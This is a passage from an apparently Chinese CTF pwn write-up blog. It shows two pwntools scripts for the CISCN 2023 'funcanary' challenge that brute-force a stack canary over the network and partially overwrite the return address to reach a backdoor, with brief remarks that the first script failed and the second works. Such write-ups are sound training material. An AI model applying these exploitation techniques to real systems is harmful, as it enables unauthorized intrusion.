<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./funcanary&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;47.93.249.245&#x27;</span>, <span class="hljs-string">&#x27;41984&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./funcanary&#x27;</span>)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span> + canary + p8(i)<br>        io.send(payload)<br>        a = io.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;have fun&#x27;</span> <span class="hljs-keyword">in</span> a:<br>            canary += p8(i)<br>            <span class="hljs-built_in">print</span>(canary)<br>            <span class="hljs-keyword">break</span><br>            <span class="hljs-comment">#print(b&#x27;canary:&#x27; + canary)</span><br>        <span class="hljs-built_in">print</span>(k, canary)<br><span class="hljs-built_in">print</span>(canary)<br>io.interactive()<br><span class="hljs-comment"># 0x1324</span><br>backdoor = <span class="hljs-number">0x1229</span><br>context(log_level =<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    tmp = m * <span class="hljs-number">16</span> + <span class="hljs-number">2</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span> + canary + <span class="hljs-string">b&#x27;deadbeef&#x27;</span> + <span class="hljs-string">b&#x27;\x31&#x27;</span> + p8(tmp)<br>    io.send(payload)<br>    a = io.recvline()<br>    <span class="hljs-built_in">print</span>(a)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> a:<br>        io.interactive()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m = &#x27;</span> + <span class="hljs-built_in">str</span>(m))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;\x29&#x27;</span> + <span class="hljs-built_in">str</span>(tmp).encode())<br>    <span class="hljs-comment">#try:</span><br>        <span class="hljs-comment">#a = rcvuntil(b&#x27;flag&#x27;)</span><br>        <span class="hljs-comment">#io.interactive()</span><br>    <span class="hljs-comment">#except:</span><br>        <span class="hljs-comment">#pass</span><br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>最后都没打通，看 wp 说是要尝试多次，等复现环境上线再看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span><br>io =remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28422</span>)<br>elf = ELF(<span class="hljs-string">&quot;./funcanary&quot;</span>)<br><br><span class="hljs-comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br>    pause()<br><br>io.recvuntil(<span class="hljs-string">&quot;welcome&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br><br>        io.send(cyclic(<span class="hljs-number">0x68</span>) + canary +  i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>))<br><br>        a = io.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;have fun&#x27;</span> <span class="hljs-keyword">in</span> a:<br><br>            canary += i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>            <span class="hljs-keyword">break</span><br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x02&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x12&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x22&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x32&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x42&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x52&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x62&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x72&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x82&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\x92&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xa2&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xb2&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xc2&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xd2&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xe2&#x27;</span><br>io.send(payload)<br>payload = cyclic(<span class="hljs-number">0x68</span>)+canary+cyclic(<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;\x28\xf2&#x27;</span><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>这个能打通</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/01/18/raspberrypi/">基于树莓派5的蓝牙嗅探环境配置 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/4.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#P-BJDCTF-2020-babystack-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">1.</span> <span class="toc-text">P | [BJDCTF 2020]babystack | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-BJDCTF-2020-babystack2-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">2.</span> <span class="toc-text">P | [BJDCTF 2020]babystack2 | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-NISACTF-2022-ezstack-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">3.</span> <span class="toc-text">P |[NISACTF 2022]ezstack | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-WUSTCTF-2020-getshell-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">4.</span> <span class="toc-text">P | [WUSTCTF 2020]getshell | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-3"><span class="toc-number">4.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="toc-number">4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-NISACTF-2022-ezpie-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">5.</span> <span class="toc-text">P |[NISACTF 2022]ezpie | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-4"><span class="toc-number">5.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="toc-number">5.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-NISACTF-2022-ezstack-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA-1"><span class="toc-number">6.</span> <span class="toc-text">P | [NISACTF 2022]ezstack | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-5"><span class="toc-number">6.1.</span> <span class="toc-text">题目说明</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number"></span> <span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#P-CISCN-2022-%E5%88%9D%E8%B5%9B-login-normal-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">1.</span> <span class="toc-text">P | [CISCN 2022 初赛]login_normal | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-6"><span class="toc-number">1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-5"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-BJDCTF-2020-babyrop2-str1k3"><span class="toc-number">2.</span> <span class="toc-text">P | [BJDCTF 2020]babyrop2 | str1k3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-7"><span class="toc-number">2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-6"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#P-NUSTCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezPwn-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA"><span class="toc-number">3.</span> <span class="toc-text">P |[NUSTCTF 2022 新生赛]ezPwn | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-8"><span class="toc-number">3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-7"><span class="toc-number">3.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-safe-shellcode"><span class="toc-number">4.</span> <span class="toc-text">[HNCTF 2022 Week1]safe_shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-9"><span class="toc-number">4.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-8"><span class="toc-number">4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-ret2text"><span class="toc-number">5.</span> <span class="toc-text">[MoeCTF 2022]ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-10"><span class="toc-number">5.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-9"><span class="toc-number">5.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2021-ezROP"><span class="toc-number">6.</span> <span class="toc-text">[MoeCTF 2021]ezROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-11"><span class="toc-number">6.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-10"><span class="toc-number">6.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-Minions"><span class="toc-number">7.</span> <span class="toc-text">[HDCTF 2023]Minions</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-12"><span class="toc-number">7.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-11"><span class="toc-number">7.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-UAF"><span class="toc-number"></span> <span class="toc-text">[NISACTF 2022]UAF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NISACTF-2022-ezheap"><span class="toc-number"></span> <span class="toc-text">[NISACTF 2022]ezheap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF-2020-YDSneedGirlfriend"><span class="toc-number"></span> <span class="toc-text">[BJDCTF 2020]YDSneedGirlfriend</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HNCTF-2022-WEEK4-ezheap"><span class="toc-number"></span> <span class="toc-text">[HNCTF 2022 WEEK4]ezheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#P-CISCN-2022-%E5%88%9D%E8%B5%9B-login-normal-%E8%A7%A3%E9%A2%98%E5%81%9A%E9%A2%98%E4%BA%BA-1"><span class="toc-number">1.</span> <span class="toc-text">P | [CISCN 2022 初赛]login_normal | 解题做题人</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-13"><span class="toc-number">1.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-12"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E4%B8%9C%E5%8D%97-PWN2"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019 东南]PWN2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-14"><span class="toc-number">2.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-13"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%8D%8E%E5%8D%97-PWN3"><span class="toc-number">3.</span> <span class="toc-text">[CISCN 2019 华南]PWN3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-15"><span class="toc-number">3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-14"><span class="toc-number">3.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E4%B8%9C%E5%8C%97-PWN2"><span class="toc-number">4.</span> <span class="toc-text">[CISCN 2019 东北]PWN2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-16"><span class="toc-number">4.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-15"><span class="toc-number">4.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%8D%8E%E4%B8%AD-PWN1"><span class="toc-number">5.</span> <span class="toc-text">[CISCN 2019 华中]PWN1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-17"><span class="toc-number">5.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-16"><span class="toc-number">5.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%8D%8E%E5%8D%97-PWN4"><span class="toc-number">6.</span> <span class="toc-text">[CISCN 2019 华南]PWN4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-18"><span class="toc-number">6.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-17"><span class="toc-number">6.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%8D%8E%E5%8C%97-PWN5"><span class="toc-number">7.</span> <span class="toc-text">[CISCN 2019 华北]PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-19"><span class="toc-number">7.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-18"><span class="toc-number">7.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019-%E5%8D%8E%E5%8D%97-PWN8"><span class="toc-number">8.</span> <span class="toc-text">[CISCN 2019 华南]PWN8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-20"><span class="toc-number">8.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-19"><span class="toc-number">8.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8D%97-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="toc-number">9.</span> <span class="toc-text">[CISCN 2023 华南] 烧烤摊儿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-21"><span class="toc-number">9.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-20"><span class="toc-number">9.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8D%97-funcanary"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 华南]funcanary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E-22"><span class="toc-number">10.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-21"><span class="toc-number">10.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>